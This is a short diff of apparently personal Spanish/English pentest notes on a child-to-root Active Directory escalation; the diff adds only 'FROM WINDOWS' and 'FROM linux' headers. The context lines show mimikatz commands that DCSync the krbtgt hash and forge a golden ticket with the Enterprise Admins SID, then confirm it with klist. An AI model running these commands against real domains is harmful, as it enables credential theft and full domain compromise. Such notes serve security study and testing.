@@ -9,7 +9,7 @@ Para realizar este ataque necesitamos:
 —The FQDN(nombre completo del host) of the child domain.
 —The SID of the Enterprise Admins group of the root domain.
 
-
+###############FROM WINDOWS
 Conseguir el KRBTGT HASH con mimikatz:
 
 lsadump::dcsync /user:LOGISTICS\krbtgt
@@ -36,3 +36,8 @@ kerberos::golden /user:<user_a_crear> /domain:<Child_domain_FQDN> /sid:<child_do
 
 Confirmar que los goldentickets se crearon:
 en PS: klist
+
+
+##################FROM linux:
+
+
